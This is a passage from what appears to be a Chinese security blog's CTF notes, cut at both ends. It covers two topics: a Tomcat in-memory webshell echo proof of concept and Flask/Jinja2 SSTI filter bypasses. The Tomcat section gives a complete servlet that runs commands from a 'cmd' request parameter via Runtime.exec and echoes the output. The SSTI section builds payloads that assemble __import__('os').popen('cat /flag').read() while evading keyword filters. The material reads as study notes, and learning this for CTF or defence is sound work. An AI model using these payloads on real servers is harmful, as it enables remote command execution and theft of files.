class="hljs-operator">=</span> (ServletRequest) threadLocal.get();<br>                System.out.println(servletRequest);<br>                System.out.println((HttpServletRequest) servletRequest == req);<br>            &#125;<br> <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一次请求将request和response对象存储进变量中，第二次请求才获取到request</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(servletRequest);<br>System.out.println((HttpServletRequest) servletRequest == req);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010824372.png" alt="image-20230201082439227"></p><h3 id="通过全局存储Response回显"><a href="#通过全局存储Response回显" class="headerlink" title="通过全局存储Response回显"></a>通过全局存储Response回显</h3><h4 id="Tomcat-9-0-55-Tomcat9-0-71废除了org-apache-catalina-loader-WebappClassLoaderBas-getResources"><a href="#Tomcat-9-0-55-Tomcat9-0-71废除了org-apache-catalina-loader-WebappClassLoaderBas-getResources" class="headerlink" title="Tomcat:9.0.55 (Tomcat9.0.71废除了org.apache.catalina.loader.WebappClassLoaderBas.getResources)"></a>Tomcat:9.0.55 (Tomcat9.0.71废除了org.apache.catalina.loader.WebappClassLoaderBas.getResources)</h4><p>在<code>AbstractProcessor</code>类中，我们能够找到全局response,在Tomcat调用栈中调用了<code>Http11Processor#service</code>方法,而<code>Http11Processor</code>继承了<code>AbstractProcessor</code>类，这里的response对象正是<code>AbstractProcessor</code>类中的属性，因此我们如果能获取到<code>Http11Processor</code>类，就能获取到response对象</p><p>调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">StandardService-----&gt;Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;<span class="hljs-built_in">this</span>.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response<br></code></pre></td></tr></table></figure><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.connector.Connector;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardService;<br><span class="hljs-keyword">import</span> org.apache.coyote.ProtocolHandler;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestGroupInfo;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestInfo;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;<br> <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br> <br><span class="hljs-meta">@WebServlet(&quot;/response&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat_Echo_Response</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br> <br>        <span class="hljs-comment">//获取StandardService</span><br>        org.apache.catalina.loader.<span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br> <br>        System.out.println(standardContext);<br> <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取ApplicationContext</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(standardContext);<br> <br>            <span class="hljs-comment">//获取StandardService</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">standardServiceField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;service&quot;</span>);<br>            standardServiceField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardService</span> <span class="hljs-variable">standardService</span> <span class="hljs-operator">=</span> (StandardService) standardServiceField.get(applicationContext);<br> <br>            <span class="hljs-comment">//获取Connector</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">connectorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;connectors&quot;</span>);<br>            connectorsField.setAccessible(<span class="hljs-literal">true</span>);<br>            Connector[] connectors = (Connector[]) connectorsField.get(standardService);<br>            <span class="hljs-type">Connector</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> connectors[<span class="hljs-number">0</span>];<br> <br>            <span class="hljs-comment">//获取Handler</span><br>            <span class="hljs-type">ProtocolHandler</span> <span class="hljs-variable">protocolHandler</span> <span class="hljs-operator">=</span> connector.getProtocolHandler();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>            handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>            org.apache.tomcat.util.net.AbstractEndpoint.<span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);<br> <br>            <span class="hljs-comment">//获取内部类AbstractProtocol$ConnectionHandler的global属性</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">globalHandler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;global&quot;</span>);<br>            globalHandler.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">RequestGroupInfo</span> <span class="hljs-variable">global</span> <span class="hljs-operator">=</span> (RequestGroupInfo) globalHandler.get(handler);<br> <br>            <span class="hljs-comment">//获取processors</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">processorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);<br>            processorsField.setAccessible(<span class="hljs-literal">true</span>);<br>            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);<br> <br>            <span class="hljs-comment">//获取request和response</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);<br>            requestField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">for</span> (RequestInfo requestInfo : requestInfoList)&#123;<br> <br>                <span class="hljs-comment">//获取org.apache.coyote.Request</span><br>                org.apache.coyote.<span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);<br> <br>                <span class="hljs-comment">//通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request</span><br>                org.apache.catalina.connector.<span class="hljs-type">Request</span> <span class="hljs-variable">http_request</span> <span class="hljs-operator">=</span> (org.apache.catalina.connector.Request) request.getNote(<span class="hljs-number">1</span>);<br>                org.apache.catalina.connector.<span class="hljs-type">Response</span> <span class="hljs-variable">http_response</span> <span class="hljs-operator">=</span> http_request.getResponse();<br> <br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> http_response.getWriter();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> http_request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(inputStream).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125;<br> <br> <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010922036.png" alt="image-20230201092245861"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p><p><a href="https://xz.aliyun.com/t/7388#toc-2">基于tomcat的内存 Webshell 无文件攻击技术 - 先知社区 (aliyun.com)</a></p><p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog (goodapple.top)</a></p><p><a href="https://www.kingkk.com/2020/03/Tomcat%E4%B8%AD%E4%B8%80%E7%A7%8D%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95/">Tomcat中一种半通用回显方法 - Kingkk’s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jinjia2 过滤器</title>
      <link href="/2023/01/16/jinjia2-%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
      <url>/2023/01/16/jinjia2-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="jinjia2-过滤器"><a href="#jinjia2-过滤器" class="headerlink" title="jinjia2  过滤器"></a>jinjia2  过滤器</h1><p><a href="https://forum.butian.net/share/1371">奇安信攻防社区-flask SSTI学习与总结 (butian.net)</a></p><h2 id="flask-过滤器"><a href="#flask-过滤器" class="headerlink" title="flask 过滤器"></a>flask 过滤器</h2><p>flask过滤器和其它语言的过滤器作用几乎一致，对数据进行过滤</p><p>使用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">变量|过滤器<br>variable|<span class="hljs-built_in">filter</span>(args)    <br>variable|<span class="hljs-built_in">filter</span>        //如果过滤器没有参数可以不加括号<br></code></pre></td></tr></table></figure><h3 id="常用过滤器"><a href="#常用过滤器" class="headerlink" title="常用过滤器"></a>常用过滤器</h3><p>**<code>int()</code>**：将值转换为int类型；</p><p>**<code>float()</code>**：将值转换为float类型；</p><p>**<code>lower()</code>**：将字符串转换为小写；</p><p>**<code>upper()</code>**：将字符串转换为大写；</p><p><code>min()</code>:求序列中最小值</p><p>**<code>title()</code>**：把值中的每个单词的首字母都转成大写；</p><p>**<code>capitalize()</code>**：把变量值的首字母转成大写，其余字母转小写；</p><p>**<code>trim()</code>**：截取字符串前面和后面的空白字符；</p><p>**<code>wordcount()</code>**：计算一个长字符串中单词的个数；</p><p>**<code>reverse()</code>**：字符串反转；</p><p>**<code>replace(value,old,new)</code>**： 替换将old替换为new的字符串；</p><p>**<code>truncate(value,length=255,killwords=False)</code>**：截取length长度的字符串；</p><p>**<code>striptags()</code>**：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</p><p>**<code>escape()</code>或<code>e</code>**：转义字符，会将<code>&lt;</code>、<code>&gt;</code>等符号转义成<code>HTML</code>中的符号。显例：<code>content|escape</code>或<code>content|e</code>。</p><p>**<code>safe()</code>**： 禁用<code>HTML</code>转义，如果开启了全局转义，那么<code>safe</code>过滤器会将变量关掉转义。示例：<code> &#123;&#123;'<em>hello</em>'|safe&#125;&#125;</code>；</p><p>**<code>list()</code>**：将变量列成列表；</p><p>**<code>string()</code>**：将变量转换成字符串；</p><p>**<code>join()</code>**：将一个序列中的参数值拼接成字符串。示例看上面<code>payload</code>；</p><p>**<code>abs()</code>**：返回一个数值的绝对值；</p><p>**<code>first()</code>**：返回一个序列的第一个元素；</p><p>**<code>last()</code>**：返回一个序列的最后一个元素；</p><p>**<code>format(value,arags,\*kwargs)</code>**：格式化字符串。比如：<code>&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!</code></p><p>**<code>length()</code>**：返回一个序列或者字典的长度；</p><p>**<code>sum()</code>**：返回列表内数值的和；</p><p>**<code>sort()</code>**：返回排序后的列表；</p><p>**<code>default(value,default_value,boolean=false)</code>**：如果当前变量没有值，则会使用参数中的值来代替。示例：<code>name|default(&#39;xiaotuo&#39;)</code>—-如果name不存在，则会使用<code>xiaotuo</code>来替代。<code>boolean=False</code>默认是在只有这个变量为<code>undefined</code>的时候才会使用<code>default</code>中的值，如果想使用<code>python</code>的形式判断是否为<code>false</code>，则可以传递<code>boolean=true</code>。也可以使用<code>or</code>来替换。</p><h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><h3 id="获取入口点"><a href="#获取入口点" class="headerlink" title="获取入口点"></a>获取入口点</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125; <br>&#123;% <span class="hljs-built_in">set</span> org = (self|string()) %&#125;&#123;&#123;org&#125;&#125; <br>&#123;% <span class="hljs-built_in">set</span> org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125; <br>&#123;% <span class="hljs-built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这些基本都能得到一长串字符串，里面包含字母、尖号、下划线、数字等，可以通过增加下标来获取</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125; <br><span class="hljs-comment"># &lt;generator object select_or_reject at 0x1047f7ac0&gt;</span><br>&#123;% <span class="hljs-built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org[<span class="hljs-number">1</span>]&#125;&#125;<br><span class="hljs-comment"># g</span><br></code></pre></td></tr></table></figure></blockquote><p>这个对应道字符串含有百分号，这样可以通过url编码得到所有字符</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;<br><span class="hljs-comment"># %3CTemplateReference%20None%3E</span><br></code></pre></td></tr></table></figure><p>这个包含了更多的字符种类</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;<br><span class="hljs-comment"># The default undefined type. This undefined type can be printed and iterated over, but every other access will raise an :exc:`UndefinedError`: &gt;&gt;&gt; foo = Undefined(name=&#x27;foo&#x27;) &gt;&gt;&gt; str(foo) &#x27;&#x27; &gt;&gt;&gt; not foo True &gt;&gt;&gt; foo + 42 Traceback (most recent call last): ... jinja2.exceptions.UndefinedError: &#x27;foo&#x27; is undefined </span><br></code></pre></td></tr></table></figure><p>对于获取数字，除了上面出现的那几种外我们还可以有以下几种方法：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> num = (self|<span class="hljs-built_in">int</span>) %&#125;&#123;&#123;num&#125;&#125;    <span class="hljs-comment"># 0, 通过int过滤器获取数字</span><br>&#123;% <span class="hljs-built_in">set</span> num = (self|string|length) %&#125;&#123;&#123;num&#125;&#125;    <span class="hljs-comment"># 24, 通过length过滤器获取数字</span><br></code></pre></td></tr></table></figure><h3 id="获取特定字符"><a href="#获取特定字符" class="headerlink" title="获取特定字符"></a>获取特定字符</h3><p>获取.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> point = self|<span class="hljs-built_in">float</span>|string|<span class="hljs-built_in">min</span> %&#125;    <span class="hljs-comment"># 通过float过滤器获取点 .</span><br></code></pre></td></tr></table></figure><p>下划线</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">24</span>)|string) %&#125;&#123;&#123;xhx&#125;&#125;  <br>&#123;% <span class="hljs-built_in">set</span> xhx=&#123; &#125;|select|string %&#125;&#123;&#123;xhx[<span class="hljs-number">24</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p>空格</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> space = ((&#123; &#125;|select|string|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">10</span>)|string) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> space = &#123; &#125;|select|string %&#125;&#123;&#123;space[<span class="hljs-number">10</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p>左括号(                </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> yin = ((app.__doc__|string|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">195</span>)|string) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> yin = app.__doc__|string %&#125;&#123;&#123;yin[<span class="hljs-number">195</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p>右括号)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> yin = ((app.__doc__|string|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">199</span>)|string) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> yin = app.__doc__|string %&#125;&#123;&#123;yin[<span class="hljs-number">199</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p>单引号’</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> yin = ((app.__doc__|string|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">181</span>)|string) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> yin = app.__doc__|string %&#125;&#123;&#123;yin[<span class="hljs-number">181</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="c的利用"><a href="#c的利用" class="headerlink" title="%c的利用"></a>%c的利用</h3><p>常见数字</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">38</span>)|<span class="hljs-built_in">int</span>) %&#125;    <span class="hljs-comment"># 0</span><br>&#123;% <span class="hljs-built_in">set</span> one = (zero**zero)|<span class="hljs-built_in">int</span> %&#125;    <span class="hljs-comment"># 1</span><br>&#123;% <span class="hljs-built_in">set</span> two = (zero-one-one)|<span class="hljs-built_in">abs</span> %&#125;    <span class="hljs-comment"># 2</span><br>&#123;% <span class="hljs-built_in">set</span> four = (two*two)|<span class="hljs-built_in">int</span> %&#125;    <span class="hljs-comment"># 4</span><br>&#123;% <span class="hljs-built_in">set</span> five = (two*two*two)-one-one-one %&#125;    <span class="hljs-comment"># 5</span><br>&#123;% <span class="hljs-built_in">set</span> seven = (zero-one-one-five)|<span class="hljs-built_in">abs</span> %&#125;    <span class="hljs-comment"># 7</span><br></code></pre></td></tr></table></figure><p>字符c</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> c = <span class="hljs-built_in">dict</span>(c=aa)|reverse|first %&#125;<br></code></pre></td></tr></table></figure><blockquote><p><strong>dict()</strong> 函数用于创建一个字典,这里dict(c&#x3D;aa)是 {‘c’: Undefined}</p></blockquote><p>百分号</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> bfh = self|string|urlencode|first %&#125; <br></code></pre></td></tr></table></figure><p>%c </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> bfhc=bfh~c %&#125; <br></code></pre></td></tr></table></figure><blockquote><p>这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</p></blockquote><p>使用%c构造斜杠 &#x2F;</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> slas = bfhc%((four~seven)|<span class="hljs-built_in">int</span>) %&#125; <br></code></pre></td></tr></table></figure><h3 id="常见字段"><a href="#常见字段" class="headerlink" title="常见字段"></a>常见字段</h3><p>builtins</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> but = <span class="hljs-built_in">dict</span>(buil=aa,tins=dd)|join %&#125;  <br></code></pre></td></tr></table></figure><p>import</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> imp = <span class="hljs-built_in">dict</span>(imp=aa,ort=dd)|join %&#125; <br></code></pre></td></tr></table></figure><p>popen</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> pon = <span class="hljs-built_in">dict</span>(po=aa,pen=dd)|join %&#125; <br></code></pre></td></tr></table></figure><p>os</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> os = <span class="hljs-built_in">dict</span>(o=aa,s=dd)|join %&#125; <br></code></pre></td></tr></table></figure><p>cat</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> ca = <span class="hljs-built_in">dict</span>(ca=aa,t=dd)|join %&#125;<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> flg = <span class="hljs-built_in">dict</span>(fl=aa,ag=dd)|join %&#125;<br></code></pre></td></tr></table></figure><p>eval</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> ev = <span class="hljs-built_in">dict</span>(ev=aa,al=dd)|join %&#125; <br></code></pre></td></tr></table></figure><p>read</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> red = <span class="hljs-built_in">dict</span>(re=aa,ad=dd)|join %&#125;  <br></code></pre></td></tr></table></figure><p><code>__builtins__</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> bul = xhx*<span class="hljs-number">2</span>~but~xhx*<span class="hljs-number">2</span> %&#125;<br></code></pre></td></tr></table></figure><p>将上面构造的字符或字符串拼接起来构造出 <code>__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> pld = xhx*<span class="hljs-number">2</span>~imp~xhx*<span class="hljs-number">2</span>~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;<br></code></pre></td></tr></table></figure><p>pld放入SSTI万能payload</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 